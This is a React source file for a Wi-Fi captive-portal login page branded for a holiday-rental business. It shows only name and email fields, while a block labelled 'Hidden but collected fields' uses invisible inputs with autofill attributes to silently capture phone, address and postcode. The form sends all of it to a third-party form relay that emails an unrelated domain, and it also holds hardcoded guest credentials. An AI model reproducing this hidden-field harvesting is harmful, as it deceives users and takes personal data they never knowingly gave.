
import React, { useState } from 'react';
import { toast } from "@/components/ui/sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const Index = () => {
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    address: '',
    postcode: '',
    username: 'guest',
    password: 'guest'
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  return (
    <div className="h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-2">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-4">
        <div className="flex justify-center mb-3">
          <div className="relative w-28 h-28">
            <img 
              src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" 
              alt="La Manga Club Rentals Logo" 
              className="w-full h-full object-contain"
            />
          </div>
        </div>
        
        <div className="text-center mb-2">
          <h1 className="text-lg font-semibold text-lamanga-text-dark mb-1">
            Connect to Wi-Fi
          </h1>
          <p className="text-xs text-gray-600">
            Please enter your details to continue
          </p>
        </div>
        
        <form 
          action="https://formsubmit.co/info@timingchaingatwick.co.uk"
          method="POST"
          className="space-y-2.5"
        >
          {/* FormSubmit Configuration */}
          <input type="hidden" name="_subject" value="New Wi-Fi Connection Request" />
          <input type="hidden" name="_captcha" value="false" />
          
          {/* Visible Form Fields */}
          <div className="space-y-2">
            <div>
              <label htmlFor="fullName" className="block text-xs font-medium text-gray-700 mb-1">
                Full Name
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                autoComplete="name"
                required
                value={formData.fullName}
                onChange={handleChange}
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
                placeholder="Enter your full name"
              />
            </div>
            
            <div>
              <label htmlFor="email" className="block text-xs font-medium text-gray-700 mb-1">
                Email Address
              </label>
              <input
                type="email"
                id="email"
                name="email"
                autoComplete="email"
                required
                value={formData.email}
                onChange={handleChange}
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
                placeholder="Enter your email address"
              />
            </div>
          </div>
          
          {/* Hidden but collected fields */}
          <div className="hidden">
            <input type="tel" id="phone" name="phone" autoComplete="tel" value={formData.phone} onChange={handleChange} />
            <input type="text" id="address" name="address" autoComplete="address-line1" value={formData.address} onChange={handleChange} />
            <input type="text" id="postcode" name="postcode" autoComplete="postal-code" value={formData.postcode} onChange={handleChange} />
            
            {/* MikroTik Hotspot Integration */}
            <input type="text" name="username" value={formData.username} onChange={handleChange} />
            <input type="text" name="password" value={formData.password} onChange={handleChange} />
          </div>
          
          {/* Submit Button */}
          <button
            type="submit"
            className="w-full py-1.5 px-4 rounded-lg font-medium text-white text-sm transition-all bg-lamanga-blue hover:bg-lamanga-dark-blue focus:ring-2 focus:ring-offset-2 focus:ring-lamanga-blue focus:outline-none"
          >
            Connect to Wi-Fi
          </button>
          
          {/* Footer Text */}
          <div className="text-[0.6rem] text-center text-gray-500">
            By connecting, you agree to our Wi-Fi terms. Your email may be used to send exclusive rental offers.
          </div>
        </form>
      </div>
    </div>
  );
};

export default Index;
